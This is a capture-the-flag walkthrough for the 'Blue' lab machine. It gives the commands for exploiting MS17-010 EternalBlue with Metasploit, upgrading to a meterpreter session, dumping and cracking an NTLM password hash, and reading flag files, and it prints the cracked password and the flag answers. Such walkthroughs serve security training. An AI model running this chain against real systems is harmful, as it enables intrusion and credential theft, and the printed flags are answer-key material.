
# 🏆 CTF Walkthrough: BLUE

## Table of Contents:
1. [Recon 🔍](#recon)
   - How many ports are open with a port number under 1000?
   - What is this machine vulnerable to?
2. [Gain Access 💻](#gain-access)
   - Exploitation Code Path
   - Setting Required Options
3. [Escalate 🚀](#escalate)
   - Convert Shell to Meterpreter
   - Migrate to New Process
4. [Cracking 🔓](#cracking)
   - Dumping Passwords
   - Cracking NTLM Hash
5. [Find Flags! 🎯](#find-flags)
   - Flag1
   - Flag2
   - Flag3

---

## Recon 🔍

### 1. How many ports are open with a port number under 1000? (Active Enumeration)
Run the following `nmap` scan:
```bash
nmap -Pn -A -sV 10.10.165.189
```

The open ports below 1000 are:

- **135/tcp** - Microsoft Windows RPC
- **139/tcp** - Microsoft Windows netbios-ssn
- **445/tcp** - Microsoft Windows SMB

Thus, there are **3** services running:
1. **msrpc** 🔐
2. **netbios-ssn** 🌐
3. **microsoft-ds** 🖥️

### 2. What is this machine vulnerable to? 🚨
The machine is vulnerable to **MS17-010**, which exploits a vulnerability in the SMB protocol known as **EternalBlue**.

---

## Gain Access 💻

### 1. Find the exploitation code we will run against the machine. What is the full path of the code?
Use `msfconsole` to search for **MS17-010**:
```bash
msf6 > search ms17-010
```

This will show the following relevant exploit:
```
exploit/windows/smb/ms17_010_eternalblue
```

### 2. Set up the exploit:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set LHOST tun0
set RHOSTS 10.10.165.189
exploit
```

### 3. Show options and set the one required value. What is the name of this value?
The required option is **RHOSTS**, which is the target machine's IP address.

---

## Escalate 🚀

### 1. If you haven't already, background the previously gained shell:
```bash
ctrl + Z
```

### 2. Convert the shell to a meterpreter shell:
Search for the post module to upgrade the shell:
```bash
search shell_to
use post/multi/manage/shell_to_meterpreter
```

### 3. Set the required option and exploit:
```bash
show options
set SESSION 1
exploit
```

### 4. Migrate to another process:
Use the `migrate` command to stabilize the session:
```bash
ps
migrate <PROCESS_ID>
```

This will help ensure the session is moved to a more stable process. 🛠️

---

## Cracking 🔓

### 1. Dump password hashes with `hashdump`:
```bash
hashdump
```

The non-default user is **Jon**.

### 2. Crack the NTLM hash:
The NTLM hash is:
```
aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Use **hashcat** to crack the hash:
```bash
echo ffb43f0de35be4d9917ac0cc8ad57f8d > hash.txt
hashcat -m 1000 -a 0 hash.txt /path/to/wordlist.txt
```

The cracked password is: **alqfna22** 🔑

---

## Find Flags! 🎯

### 1. **Flag1**: Located at the system root.
```bash
cd C://
dir
type flag1.txt
```
Flag1 content: **flag{access_the_machine}** 💡

### 2. **Flag3**: Located in the Administrator's Documents folder.
```bash
cd Users/Jon/Documents
type flag3.txt
```
Flag3 content: **flag{admin_documents_can_be_valuable}** 📂

### 3. **Flag2**: Located in `System32/config`.
```bash
cd C:\Windows\System32\config
dir
type flag2.txt
```
Flag2 content: **flag{sam_database_elevated_access}** 🔒

---

## Conclusion 🏁

This walkthrough guides you through exploiting the **MS17-010 EternalBlue** vulnerability to gain access to a Windows machine, escalate privileges, dump passwords, crack hashes, and locate flags on the system. With persistence and the correct tools, lateral movement and privilege escalation are key to successfully solving the challenge. 🎉

---

📌 Created by c1ph3r1337 🕶️🔥
